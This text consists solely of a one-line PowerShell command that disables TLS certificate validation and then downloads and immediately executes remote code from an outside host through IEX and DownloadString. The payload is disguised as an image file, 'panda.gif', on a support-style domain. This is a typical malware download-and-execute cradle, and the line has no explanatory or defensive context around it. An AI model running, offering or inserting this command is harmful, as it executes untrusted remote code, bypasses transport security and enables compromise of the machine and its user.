
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};IEX ((new-object net.webclient).downloadstring('https://www.security-support.tech/panda.gif'))

